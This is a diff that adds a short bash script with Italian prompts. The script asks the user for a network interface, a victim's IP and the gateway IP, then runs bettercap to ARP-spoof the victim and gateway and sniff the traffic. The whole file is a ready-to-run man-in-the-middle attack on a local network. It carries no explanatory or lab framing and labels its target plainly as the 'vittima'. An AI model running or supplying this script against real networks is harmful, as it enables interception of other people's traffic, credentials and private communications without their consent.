@@ -1,0 +1,16 @@
+#!/bin/bash
+
+read -p "Inserisci il nome dell'interfaccia di rete: " iface
+read -p " Inserisci l'IP della vittima: " victim
+read -p " Inserisci l'IP del gateway/router: " router
+
+echo "    Interfaccia: $iface"
+echo "    Vittima:     $victim"
+echo "    Gateway:     $router"
+
+sudo bettercap -iface "$iface" <<EOF
+set arp.spoof.targets $victim
+set arp.spoof.gateway $router
+arp.spoof on
+net.sniff on
+EOF
